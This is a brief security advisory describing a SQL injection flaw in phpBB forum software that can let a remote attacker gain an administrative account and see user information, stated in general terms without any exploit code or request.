phpBB is free, open-source, easy-to-use web forums software.

An issue exists in phpBB which allows a remote attacker to manipulate SQL queries in such a way as to gain an administrative account with the service.

This problem is due to improper validation of user-supplied input by certain variables in phpBB. This issue can be exploited by making a cleverly crafted web request that contains arbitrary user-supplied replacement values.

One consequence of successful exploitation is that the attacker will be privy to user information.
